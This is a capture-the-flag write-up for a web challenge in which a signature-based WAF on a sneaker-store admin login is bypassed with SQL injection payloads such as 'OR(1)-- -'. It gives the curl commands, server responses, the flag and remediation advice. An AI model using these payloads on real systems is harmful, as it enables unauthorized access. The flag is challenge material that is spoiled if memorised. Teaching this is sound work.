# Solevault

**Category:** Web · **Points:** 1000

> SoleVault — our newest homegrown sneaker label just dropped its SS'26 lineup... word on the street is the team left something valuable on an internal console, and they really trust their shiny new firewall. &nbsp; `http://sole.136.82.117.70.nip.io/`

**Flag:** `kBxAc{si9n4ture_waf_b|0ck5_0n|y_7he_f4m0us_pay1oad5_sw@p_the_numb3r5_and_@ny_t4u+0l0gy_wi1l_0p3n_7he_$o1evau|+_4dm!n_con5ol3}`

---

## The short version

SoleVault looked like a normal sneaker store, but its administrator login was vulnerable to SQL injection. The site had a web application firewall (WAF), although it only recognized a handful of famous attack strings. By changing the usual `OR 1=1` payload to the equivalent `OR(1)`, I slipped past the firewall, logged in as the first administrator, and found the flag in the admin panel.

## Reconnaissance

I started by loading the home page and checking the standard files that often reveal hidden routes:

```bash
curl -i http://sole.136.82.117.70.nip.io/
curl http://sole.136.82.117.70.nip.io/robots.txt
```

The interesting part of `robots.txt` was:

```text
User-agent: *
Disallow: /cart
Disallow: /checkout
Disallow: /account
Disallow: /admin

# Legacy paths kept for old crawlers
Disallow: /legacy-admin
Disallow: /console
```

`robots.txt` is not an access-control system. It merely asks search engines not to index certain pages, so anyone can still visit the listed paths. In this case, `/admin` led to a staff login form.

## Testing the admin login

The form submitted two fields to `/admin` with a normal HTTP POST request:

```text
username
password
```

Entering ordinary incorrect credentials produced this message:

```text
Invalid username or password.
```

That by itself was not especially helpful, so I tested the classic SQL injection idea:

```text
' OR 1=1-- -
```

Instead of reaching the application, this received an HTTP `403` response from **SoleVault Shield**. The block page even disclosed the firewall rule:

```text
Rule SQLI-1001 · Known tautology signature
```

This was a useful clue. The firewall was apparently searching for well-known text patterns such as `OR 1=1`, rather than understanding what the SQL actually did.

## What SQL injection means here

The backend was likely building a database query using the supplied strings directly. Conceptually, it may have looked similar to this:

```sql
SELECT * FROM users
WHERE username = '<username>' AND password = '<password>';
```

If the username is changed to the following payload:

```text
'OR(1)-- -
```

the final query becomes conceptually similar to:

```sql
SELECT * FROM users
WHERE username = '' OR (1)-- -' AND password = 'x';
```

Here is what each part does:

- The first `'` closes the username string early.
- `OR (1)` adds a condition that is always true because SQL treats the nonzero value `1` as true.
- `-- -` starts a SQL comment, causing the rest of the query, including the password check, to be ignored.

In plain English, the query changes from **“find the user with this username and password”** to **“find a user where this always-true condition is true.”** The database returns its first matching user, which was the administrator.

Most importantly, `OR(1)` means essentially the same thing as `OR 1=1`, but it does not contain the exact famous tautology signature the WAF expected.

Another equivalent bypass I found was:

```text
admin' OR 0=0-- -
```

The `0=0` condition is also always true, yet the WAF was focused on better-known patterns such as `1=1`.

## Exploitation

I submitted the bypass payload as the username and used any value for the password:

```bash
curl -i \
  -c cookies.txt \
  --data-urlencode "username='OR(1)-- -" \
  --data-urlencode "password=x" \
  http://sole.136.82.117.70.nip.io/admin
```

The response changed from an ordinary login failure to:

```text
HTTP/1.1 302 FOUND
Location: /admin/panel
Set-Cookie: sv_admin=...
```

An HTTP `302` is a redirect. The server had accepted the login, issued an administrator session cookie, and sent the browser to the admin panel.

I then requested that page while sending the saved cookie:

```bash
curl -b cookies.txt \
  http://sole.136.82.117.70.nip.io/admin/panel
```

The panel identified the session as the owner-role **Store Administrator**. Near the bottom was a card labeled:

```text
Regulatory · Compliance asset #7 · Do not share
```

That card contained the flag.

## Flag

```text
kBxAc{si9n4ture_waf_b|0ck5_0n|y_7he_f4m0us_pay1oad5_sw@p_the_numb3r5_and_@ny_t4u+0l0gy_wi1l_0p3n_7he_$o1evau|+_4dm!n_con5ol3}
```

## Why the firewall failed

The firewall used a blacklist of recognizable strings. Blacklists are fragile because SQL offers many ways to express the same idea. Changing spacing, parentheses, comments, capitalization, operators, or the numbers in a true comparison can be enough to evade a simplistic rule.

The real fix belongs in the application, not just in front of it:

1. Use parameterized queries (prepared statements) so input is handled as data rather than executable SQL.
2. Store passwords with a strong password-hashing algorithm and verify them separately.
3. Keep the WAF as an additional layer, not the primary defense.
4. Avoid revealing internal firewall rule names on public error pages.
5. Rate-limit and monitor login attempts.

## Takeaway

The challenge title fit nicely: the valuable data really was sitting in an internal-looking console, and the team trusted its shiny firewall too much. The WAF knew the most famous SQL injection phrase, but the underlying login was still vulnerable. Swapping the syntax while keeping the same SQL meaning was enough to open the SoleVault admin console.
